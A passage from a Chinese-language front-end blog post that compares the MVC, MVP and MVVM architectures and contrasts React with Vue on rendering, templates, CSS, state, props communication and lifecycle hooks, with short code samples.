View)区别:</h4></li></ol><ul><li>后者View和Model完全解耦，它们之间的通信是通过Presenter (MVC中的Controller)来进行的，所有的交互都发生在Presenter内部;</li><li>前者Controller只能通过Model间接触发View自行更新视图,后者View不再负责更新视图,而是提供接口给Presenter执行;</li></ul><h2 id="Supervising-Controller-监督控制器"><a href="#Supervising-Controller-监督控制器" class="headerlink" title="Supervising Controller(监督控制器)"></a>Supervising Controller(监督控制器)</h2><p>Presenter依旧占据主导地位,但是会把一部分简单的视图逻辑(如双向绑定)交还给View和Model进行处理,自身负责其他复杂的视图逻辑.</p><ul><li>Model(业务模型): 用于管理应用程序数据处理逻辑的部分,通过观察者模式(Pub&amp;Sub / Events)发送消息给Presenter或者View;</li><li>View(视图界面): 用于处理数据显示的部分和接管部分简单的视图逻辑,同步简单的视图和模型的状态,传递事件和提供相关接口给Presenter;</li><li>Presenter(派发器): 作为中间层同步控制著Model数据修改和View视图变化;</li></ul><p>MVC和MVP(Supervising Controller)区别:</p><ol><li>视图支持Presenter和View两种途径更新;</li></ol><h4 id="优点-1"><a href="#优点-1" class="headerlink" title="优点:"></a>优点:</h4><ol><li>模型与视图高度分离，我们可以修改视图而不影响模型;</li><li>可以更高效地使用模型，因为所有的交互都发生在一个地方——Presenter内部;</li><li>可以将一个Presenter用于多个视图，而不需要改变Presenter的逻辑;</li><li>如果把逻辑放在Presenter中，就可以脱离用户接口来测试这些逻辑（单元测试）;</li></ol><h4 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点:"></a>缺点:</h4><ol><li>由于对视图的渲染放在了Presenter中，所以View和Presenter的交互会过于频繁并且难以维护;</li></ol><h2 id="MVVM"><a href="#MVVM" class="headerlink" title="MVVM"></a>MVVM</h2><p>MVVM全名是<strong>Model-View-ViewModel</strong>,本质上就是MVC的改进版,也可以说是MVP的改良版,把应用程序分成三部分分别是:</p><ul><li>Model(业务模型): 用于管理应用程序数据;</li><li>View(视图界面): 通过使用模板语法来声明式的将数据渲染进DOM;</li><li>ViewModel(视图模型): 包含了领域模型（Domain Model）和视图的状态（State）,核心就是双向绑定技术（Two-Way-Data-Binding）,View和Model之间数据同步操作交由给内部的Binder/Data-binding engine处理;</li></ul><p>MVP和MVVM区别: 它使用 数据绑定(Data Binding)、依赖属性(Dependency Property)、命令(Command)、路由事件(Routed Event) 来搞定与view层的交互, 当ViewModel对Model进行更新的时候，会通过数据绑定更新到View.<br><img src="https://upload-images.jianshu.io/upload_images/15531792-bd03b1577decb97b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="优点-2"><a href="#优点-2" class="headerlink" title="优点:"></a>优点:</h4><ul><li>双向绑定（data-binding）：View的变动，自动反映在 ViewModel，反之亦然;</li><li>解放MVP大量手动同步状态的问题，提高了代码的可维护性;</li><li>简化测试,Model正确就能保证View输出;<h4 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点:"></a>缺点:</h4></li><li>大型项目的绑定数据较多会提高维护成本;</li><li>View里的数据绑定无法检测断点,只能从Model下手;</li></ul><h1 id="2-React-VS-Vue"><a href="#2-React-VS-Vue" class="headerlink" title="2 React VS Vue"></a>2 React VS Vue</h1><p>两个框架是现在最热门的选择之一,它们既类似又不同.</p><ul><li>使用 Virtual DOM</li><li>提供了响应式 (Reactive) 和组件化 (Composable) 的视图组件。</li><li>将注意力集中保持在核心库，而将其他功能如路由和全局状态管理交给相关的库。</li></ul><p>React就是MVC里的V,只专注视图层,而Vue算是MVVM框架,双向绑定是特色之一.</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="React"><a href="#React" class="headerlink" title="React"></a>React</h3><p>React is a JavaScript library for building user interfaces.</p><ul><li><p>Declarative: React makes it painless to create interactive UIs. Design simple views for each state in your application, and React will efficiently update and render just the right components when your data changes. Declarative views make your code more predictable, simpler to understand, and easier to debug.</p></li><li><p>Component-Based: Build encapsulated components that manage their own state, then compose them to make complex UIs. Since component logic is written in JavaScript instead of templates, you can easily pass rich data through your app and keep state out of the DOM.</p></li><li><p>Learn Once, Write Anywhere: We don’t make assumptions about the rest of your technology stack, so you can develop new features in React without rewriting existing code. React can also render on the server using Node and power mobile apps using React Native.</p><h3 id="翻译"><a href="#翻译" class="headerlink" title="翻译:"></a>翻译:</h3><p>React是一个用于构建用户界面的Javascript库.</p></li><li><p>声明式: React让你无痛创建交互式UI界面,为你的App应用程序里的每个状态设计简单的视图,并且当你的数据改变之后会进行高效地更新和正确地渲染对应组件,声明式视图让你的代码更可预测、更易于理解和更容易调试.</p></li><li><p>组件化: 构建封装组件管理它们自己的内部状态,然后组合它们去构建复杂UI界面.因为组件逻辑写在Javascript而不是模板里,你能轻松注入丰富的数据到你的App并且状态脱离在Dom之外.</p></li><li><p>只需学习一次,就能用到任何地方,我们不对你的其余技术栈作出假设,所以你能在React里开发新的特性而不需要重写你的现有代码.React也能使用Nodejs进行服务器渲染和使用React Native进行移动端的丰富开发.</p></li></ul><h3 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h3><p>Vue (pronounced /vjuː/, like view) is a progressive framework for building user interfaces. Unlike other monolithic frameworks, Vue is designed from the ground up to be incrementally adoptable. The core library is focused on the view layer only, and is easy to pick up and integrate with other libraries or existing projects. On the other hand, Vue is also perfectly capable of powering sophisticated Single-Page Applications when used in combination with modern tooling and supporting libraries.</p><h3 id="翻译-1"><a href="#翻译-1" class="headerlink" title="翻译:"></a>翻译:</h3><p>Vue.js (读音 /vjuː/，类似于 view) 是一套构建用户界面的渐进式框架。与其他重量级框架不同的是，Vue 采用自底向上增量开发的设计。Vue 的核心库只关注视图层，它不仅易于上手，还便于与第三方库或既有项目整合。另一方面，当与单文件组件和 Vue 生态系统支持的库结合使用时，Vue 也完全能够为复杂的单页应用程序提供驱动。</p><h2 id="声明式渲染"><a href="#声明式渲染" class="headerlink" title="声明式渲染"></a>声明式渲染</h2><h3 id="React-官方写法"><a href="#React-官方写法" class="headerlink" title="React(官方写法)"></a>React(官方写法)</h3><p>React 组件实现一个 render() 方法，它接收输入数据并返回显示的内容。此示例使用类似XML的语法，称为 JSX 。输入数据可以通过 this.props 传入组件，被 render() 访问。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class HelloMessage extends React.Component &#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        Hello &#123;this.props.name&#125;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">  &lt;HelloMessage name&#x3D;&quot;Taylor&quot; &#x2F;&gt;,</span><br><span class="line">  mountNode</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="Vue-官方写法"><a href="#Vue-官方写法" class="headerlink" title="Vue(官方写法)"></a>Vue(官方写法)</h3><p>Vue.js 的核心是一个允许采用简洁的模板语法来声明式的将数据渲染进 DOM 的系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">  &#123;&#123; message &#125;&#125;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&#x2F;&#x2F; --------省略--------</span><br><span class="line">var app &#x3D; new Vue(&#123;</span><br><span class="line">  el: &#39;#app&#39;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    message: &#39;Hello Vue!&#39;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><h3 id="React-JSX"><a href="#React-JSX" class="headerlink" title="React JSX"></a>React JSX</h3><p>他是 JavaScrip 的一种扩展语法。 React 官方推荐使用这种语法来描述 UI 信息。JSX 可能会让你想起某种模板语言，但是它具有 JavaScrip 的全部能力,从本质上讲，JSX 只是为 React.createElement(component, props, …children) 函数提供的语法糖。</p><ul><li>JSX 执行更快，因为它在编译为 JavaScript 代码后进行了优化。</li><li>它是类型安全的，在编译过程中就能发现错误。</li><li>使用 JSX 编写模板更加简单快速。</li></ul><p>JSX 对使用React 不是必须的。</p><h3 id="Vue-Templates"><a href="#Vue-Templates" class="headerlink" title="Vue Templates"></a>Vue Templates</h3><p>Vue.js 使用了基于 HTML 的模板语法，允许开发者声明式地将 DOM 绑定至底层 Vue 实例的数据。所有 Vue.js 的模板都是合法的 HTML ，所以能被遵循规范的浏览器和 HTML 解析器解析。<br>在底层的实现上，Vue 将模板编译成虚拟 DOM 渲染函数。结合响应系统，在应用状态改变时，Vue 能够智能地计算出重新渲染组件的最小代价并应用到 DOM 操作上。<br>事实上 Vue 也提供了渲染函数，甚至支持 JSX。然而，默认推荐的还是模板。</p><ul><li>对于很多习惯了 HTML 的开发者来说，模板比起 JSX 读写起来更自然。这里当然有主观偏好的成分，但如果这种区别会导致开发效率的提升，那么它就有客观的价值存在。</li><li>基于 HTML 的模板使得将已有的应用逐步迁移到 Vue 更为容易。</li><li>这也使得设计师和新人开发者更容易理解和参与到项目中。</li><li>你甚至可以使用其他模板预处理器，比如 Pug 来书写 Vue 的模板。</li></ul><h3 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h3><p>个人感觉两者其实上手速度都挺快,相比之下JSX除了修改部分属性名字跟普通HTML变化不算大,Templates额外添加很多自定义功能帮助开发者做更多的事,框架痕迹也比较重.<br>我们可以把组件区分为两类：一类是偏视图表现的 (presentational)推荐使用模板，一类则是偏逻辑的 (logical)推荐使用 JSX 或渲染函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;Jsx写法</span><br><span class="line">&lt;div className&#x3D;&quot;list&quot;&gt;</span><br><span class="line">    &lt;ol&gt;</span><br><span class="line">        &#123; todos.map(item &#x3D;&gt;&lt;li&gt;&#123;todo.text&#125;&lt;&#x2F;li&gt;) &#125;</span><br><span class="line">    &lt;&#x2F;ol&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;Templates写法</span><br><span class="line">&lt;div class&#x3D;&quot;list&quot;&gt;</span><br><span class="line">    &lt;ol&gt;</span><br><span class="line">        &lt;li v-for&#x3D;&quot;todo in todos&quot;&gt;</span><br><span class="line">            &#123;&#123; todo.text &#125;&#125;</span><br><span class="line">        &lt;&#x2F;li&gt;</span><br><span class="line">    &lt;&#x2F;ol&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><h3 id="React-1"><a href="#React-1" class="headerlink" title="React"></a>React</h3><p>React 中推荐通过 CSS-in-JS 的方案实现的 (比如 styled-components、glamorous 和 emotion),虽然在构建时将 CSS 提取到一个单独的样式表是支持的，但 bundle 里通常还是需要一个运行时程序来让这些样式生效。当你能够利用 JavaScript 灵活处理样式的同时，也需要权衡 bundle 的尺寸和运行时的开销</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var styleObj &#x3D; &#123; color:&quot;blue&quot;, fontSize:40, fontWeight:&quot;normal&quot; &#125;;</span><br><span class="line">--------省略--------</span><br><span class="line">&lt;h1 style&#x3D;&#123;styleObj&#125; className&#x3D;&quot;alert-text&quot;&gt;Hello&lt;&#x2F;h1&gt;</span><br></pre></td></tr></table></figure><p>这个可选 scoped 属性会自动添加一个唯一的属性 (比如 data-v-21e5b78) 为组件内 CSS 指定作用域，编译的时候 .list-container:hover 会被编译成类似 .list-container[data-v-21e5b78]:hover。<br>最后，Vue 的单文件组件里的样式设置是非常灵活的。通过 vue-loader，你可以使用任意预处理器、后处理器，甚至深度集成 CSS Modules——全部都在 <style> 标签内。</p><h3 id="对比-1"><a href="#对比-1" class="headerlink" title="对比"></a>对比</h3><p>各有好坏吧,React侵入式做法不太喜欢,Vue组件式做法倒也还行,个人而言更倾向独立css样式外部引入易于管理.</p><h2 id="状态-State-OR-属性-Data"><a href="#状态-State-OR-属性-Data" class="headerlink" title="状态(State) OR 属性(Data)"></a>状态(State) OR 属性(Data)</h2><h3 id="React-2"><a href="#React-2" class="headerlink" title="React"></a>React</h3><p>State是私有的，并且由组件本身完全控制。</p><p>不要直接修改 state(状态),setState() 代替;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 错误</span><br><span class="line">this.state.comment &#x3D; &#39;Hello&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 正确</span><br><span class="line">this.setState(&#123;comment: &#39;Hello&#39;&#125;);</span><br></pre></td></tr></table></figure><p>state(状态)更新会被合并,React 为了优化性能，有可能会将多个setState()调用合并为一次更新;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">componentDidMount() &#123;</span><br><span class="line">  fetchPosts().then(response &#x3D;&gt; &#123;</span><br><span class="line">    this.setState(&#123;</span><br><span class="line">      posts: response.posts</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  fetchComments().then(response &#x3D;&gt; &#123;</span><br><span class="line">    this.setState(&#123;</span><br><span class="line">      comments: response.comments</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>state(状态) 更新可能是异步的,不能依赖他们的值计算下一个state(状态);</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 错误</span><br><span class="line">this.setState(&#123;</span><br><span class="line">  counter: this.state.counter + this.props.increment,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 正确</span><br><span class="line">&#x2F;&#x2F;另一种 setState() 的形式，它接受一个函数而不是一个对象。这个函数将接收前一个状态作为第一个参数，应用更新时的 props 作为第二个参数</span><br><span class="line">this.setState((prevState, props) &#x3D;&gt; (&#123;</span><br><span class="line">  counter: prevState.counter + props.increment</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><h3 id="Vue-1"><a href="#Vue-1" class="headerlink" title="Vue"></a>Vue</h3><p>当一个 Vue 实例被创建时，它向 Vue 的响应式系统中加入了其 data 对象中能找到的所有的属性。当这些属性的值发生改变时，视图将会产生“响应”，即匹配更新为新的值。</p><p>只有当实例被创建时 data 中存在的属性是响应式的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 有效</span><br><span class="line">data: &#123;</span><br><span class="line">  visitCount1: 0</span><br><span class="line">&#125;</span><br><span class="line">--------省略--------</span><br><span class="line">&#x2F;&#x2F; 触发任何视图的更新</span><br><span class="line">vm.visitCount1 &#x3D; 2</span><br><span class="line">&#x2F;&#x2F; 不会触发任何视图的更新</span><br><span class="line">vm.visitCount2 &#x3D; 2</span><br></pre></td></tr></table></figure><h3 id="对比-2"><a href="#对比-2" class="headerlink" title="对比"></a>对比</h3><p>React是属于单向控制,即只能是通过改变State从而改变视图,我们可以利用JS方法像表单等场景模拟双向绑定的效果,实际还是由State去触发视图更新<br>Vue是属于双向绑定,原理是通过 Object.defineProperty 监听劫持data对象的getter/setter属性来实现的</p><h2 id="Props组件通信"><a href="#Props组件通信" class="headerlink" title="Props组件通信"></a>Props组件通信</h2><p>一个组件可以选择将数据向下传递，作为其子组件的 props(属性).</p><h3 id="React-3"><a href="#React-3" class="headerlink" title="React"></a>React</h3><p>父组件单向控制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;父组件传递数据</span><br><span class="line">&lt;Child num&#x3D;&#123;this.state.num&#125; &#x2F;&gt;</span><br><span class="line">&#x2F;&#x2F;--------省略--------</span><br><span class="line">&#x2F;&#x2F;子组件读取数据</span><br><span class="line">&lt;h2&gt;It is &#123;this.props.num&#125;.&lt;&#x2F;h2&gt;</span><br></pre></td></tr></table></figure><p>子组件自主控制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;父组件传递数据</span><br><span class="line">&lt;Child num&#x3D;&#123;this.state.num&#125; &#x2F;&gt;</span><br><span class="line">&#x2F;&#x2F;--------省略--------</span><br><span class="line">constructor(props) &#123;</span><br><span class="line">  super(props);</span><br><span class="line">  this.state &#x3D; &#123;</span><br><span class="line">      &#x2F;&#x2F;初始化成state</span><br><span class="line">      num: this.props.num,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>父子组件双向控制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;传递修改函数</span><br><span class="line">class Father extends Component &#123;</span><br><span class="line">  construtor(props) &#123;</span><br><span class="line">    super(props);</span><br><span class="line">    this.state &#x3D; &#123;</span><br><span class="line">      num: 1,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  onChangeState(val) &#123;</span><br><span class="line">    this.setState(val);</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    &lt;Child num&#x3D;&#123;this.state.num&#125; onClicked&#x3D;&#123;this.onChangeState.bind(this)&#125; &#x2F;&gt;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;调用修改函数添加入参</span><br><span class="line">class Child extends Component &#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    &lt;button onClicked&#x3D;&#123;() &#x3D;&gt; this.props.onClicked(&#123;num: 2&#125;)&#125;&gt;</span><br><span class="line">      It is &#123;this.props.num&#125;.</span><br><span class="line">    &lt;&#x2F;button&gt;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Vue-2"><a href="#Vue-2" class="headerlink" title="Vue"></a>Vue</h3><p>父组件单向控制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;父组件传递数据</span><br><span class="line">&lt;child message&#x3D;&quot;hello!&quot;&gt;&lt;&#x2F;child&gt;</span><br><span class="line">&#x2F;&#x2F;--------省略--------</span><br><span class="line">&#x2F;&#x2F;子组件要显式地用 props 选项声明它预期的数据</span><br><span class="line">Vue.component(&#39;child&#39;, &#123;</span><br><span class="line">  &#x2F;&#x2F; 声明 props</span><br><span class="line">  props: [&#39;message&#39;],</span><br><span class="line">  &#x2F;&#x2F; 就像 data 一样，prop 也可以在模板中使用</span><br><span class="line">  &#x2F;&#x2F; 同样也可以在 vm 实例中通过 this.message 来使用</span><br><span class="line">  template: &#39;&lt;span&gt;&#123;&#123; message &#125;&#125;&lt;&#x2F;span&gt;&#39;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>子组件自主控制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;父组件传递数据</span><br><span class="line">&lt;child message&#x3D;&quot;hello!&quot;&gt;&lt;&#x2F;child&gt;</span><br><span class="line">&#x2F;&#x2F;--------省略--------</span><br><span class="line">&#x2F;&#x2F;1, 定义一个局部变量，并用 prop 的值初始化它：</span><br><span class="line">props: [&#39;message&#39;],</span><br><span class="line">data: function () &#123;</span><br><span class="line">  return &#123; msg: this.message &#125;</span><br><span class="line">&#125;</span><br><span class="line">template: &#39;&lt;span&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;span&gt;&#39;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;2, 定义一个计算属性，处理 prop 的值并返回：</span><br><span class="line">props: [&#39;message&#39;],</span><br><span class="line">computed: &#123;</span><br><span class="line">  msg: function () &#123;</span><br><span class="line">    return this.message</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">template: &#39;&lt;span&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;span&gt;&#39;</span><br></pre></td></tr></table></figure><p>父子组件双向控制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;父组件传递数据</span><br><span class="line">&lt;child v-bind:message&#x3D;&quot;message&quot; v-on:update:message&#x3D;&quot;message &#x3D; $event&quot;&gt;&lt;&#x2F;child&gt;</span><br><span class="line">&#x2F;&#x2F;--------可用.sync 修饰符替代--------</span><br><span class="line">&#x2F;&#x2F;后面传递的message是变量,非字符串</span><br><span class="line">&#x2F;&#x2F;&lt;child :message.sync&#x3D;&quot;message&quot;&gt;&lt;&#x2F;child&gt;</span><br><span class="line">&#x2F;&#x2F;--------省略--------</span><br><span class="line">&#x2F;&#x2F;子组件</span><br><span class="line">props: [&#39;message&#39;],</span><br><span class="line">data: function () &#123;</span><br><span class="line">  return &#123; msg: this.message &#125;</span><br><span class="line">&#125;</span><br><span class="line">watch: &#123;</span><br><span class="line">    &#x2F;&#x2F;监听msg变化自动通信父组件更改</span><br><span class="line">    msg(val) &#123;</span><br><span class="line">        this.$emit(&#39;update:message&#39;, newMsg)</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="生命周期对比"><a href="#生命周期对比" class="headerlink" title="生命周期对比"></a>生命周期对比</h2><h3 id="React-4"><a href="#React-4" class="headerlink" title="React"></a>React</h3><table><thead><tr><th>React生命周期</th><th>作用</th></tr></thead><tbody><tr><td>getDefaultProps</td><td>作用于组件类，只调用一次，返回对象用于设置默认的props，对于引用值，会在实例中共享</td></tr><tr><td>getInitialState</td><td>作用于组件的实例，在实例创建时调用一次，用于初始化每个实例的state，此时可以访问this.props。</td></tr><tr><td>componentWillMount</td><td>在完成首次渲染之前调用，此时仍可以修改组件的state</td></tr><tr><td>render</td><td>必选的方法，创建虚拟DOM，该方法具有特殊的规则: 1) 只能通过this.props和this.state访问数据; 2) 可以返回null、false或任何React组件; 3) 只能出现一个顶级组件（不能返回数组）; 4) 不能改变组件的状态; 5) 不能修改DOM的输出;</td></tr><tr><td>componentDidMount</td><td>真实的DOM被渲染出来后调用，在该方法中可通过this.getDOMNode()访问到真实的DOM元素。此时已可以使用其他类库来操作这个DOM。在服务端中，该方法不会被调用。</td></tr><tr><td>componentWillReceiveProps</td><td>组件接收到新的props时调用，并将其作为参数nextProps使用，此时可以更改组件props及state</td></tr><tr><td>shouldComponentUpdate</td><td>组件是否应当渲染新的props或state，返回false表示跳过后续的生命周期方法，通常不需要使用以避免出现bug。在出现应用的瓶颈时，可通过该方法进行适当的优化。在首次渲染期间或者调用了forceUpdate方法后，该方法不会被调用</td></tr><tr><td>componentWillUpdate</td><td>接收到新的props或者state后，进行渲染之前调用，此时不允许更新props或state。</td></tr><tr><td>componentDidUpdate</td><td>完成渲染新的props或者state后调用，此时可以访问到新的DOM元素。</td></tr><tr><td>componentWillUnmount</td><td>组件被移除之前被调用，可以用于做一些清理工作，在componentDidMount方法中添加的所有任务都需要在该方法中撤销，比如创建的定时器或添加的事件监听器</td></tr><tr><td>componentDidCatch</td><td>16.x新增,捕获全局异常来进行页面的友好提示</td></tr></tbody></table><table><thead><tr><th>Vue生命周期</th><th>作用</th></tr></thead><tbody><tr><td>beforeCreate</td><td>在实例初始化之后，数据观测 (data observer) 和 event/watcher 事件配置之前被调用</td></tr><tr><td>created</td><td>在实例创建完成后被立即调用。在这一步，实例已完成以下的配置：数据观测 (data observer)，属性和方法的运算，watch/event 事件回调。然而，挂载阶段还没开始，$el 属性目前不可见</td></tr><tr><td>beforeMount</td><td>在挂载开始之前被调用：相关的 render 函数首次被调用。该钩子在服务器端渲染期间不被调用</td></tr><tr><td>mounted</td><td>el 被新创建的 vm.$el 替换，并挂载到实例上去之后调用该钩子。如果 root 实例挂载了一个文档内元素，当 mounted 被调用时 vm.$el 也在文档内. 注意 mounted 不会承诺所有的子组件也都一起被挂载。如果你希望等到整个视图都渲染完毕，可以用 vm.$nextTick 替换掉 mounted</td></tr><tr><td>beforeUpdate</td><td>数据更新时调用，发生在虚拟 DOM 重新渲染和打补丁之前。你可以在这个钩子中进一步地更改状态，这不会触发附加的重渲染过程。该钩子在服务器端渲染期间不被调用</td></tr><tr><td>updated</td><td>由于数据更改导致的虚拟 DOM 重新渲染和打补丁，在这之后会调用该钩子。当这个钩子被调用时，组件 DOM 已经更新，所以你现在可以执行依赖于 DOM 的操作。然而在大多数情况下，你应该避免在此期间更改状态。如果要相应状态改变，通常最好使用计算属性或 watcher 取而代之,注意 updated 不会承诺所有的子组件也都一起被重绘。如果你希望等到整个视图都重绘完毕，可以用 vm.$nextTick 替换掉 updated：该钩子在服务器端渲染期间不被调用</td></tr><tr><td>activated</td><td>keep-alive 组件激活时调用。该钩子在服务器端渲染期间不被调用</td></tr><tr><td>deactivated</td><td>keep-alive 组件停用时调用。该钩子在服务器端渲染期间不被调用</td></tr><tr><td>beforeDestroy</td><td>实例销毁之前调用。在这一步，实例仍然完全可用。该钩子在服务器端渲染期间不被调用。</td></tr><tr><td>destroyed</td><td>Vue 实例销毁后调用。调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁</td></tr><tr><td>errorCaptured</td><td>当捕获一个来自子孙组件的错误时被调用。此钩子会收到三个参数：错误对象、发生错误的组件实例以及一个包含错误来源信息的字符串。此钩子可以返回 false 以阻止该错误继续向上传播</td></tr></tbody></table><h3 id="React示意图"><a href="#React示意图" class="headerlink" title="React示意图"></a>React示意图</h3><p><img src="https://upload-images.jianshu.io/upload_images/15531792-21db4cd6e0492623.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="Vue示意图"><a href="#Vue示意图" class="headerlink" title="Vue示意图"></a>Vue示意图</h3><p><img 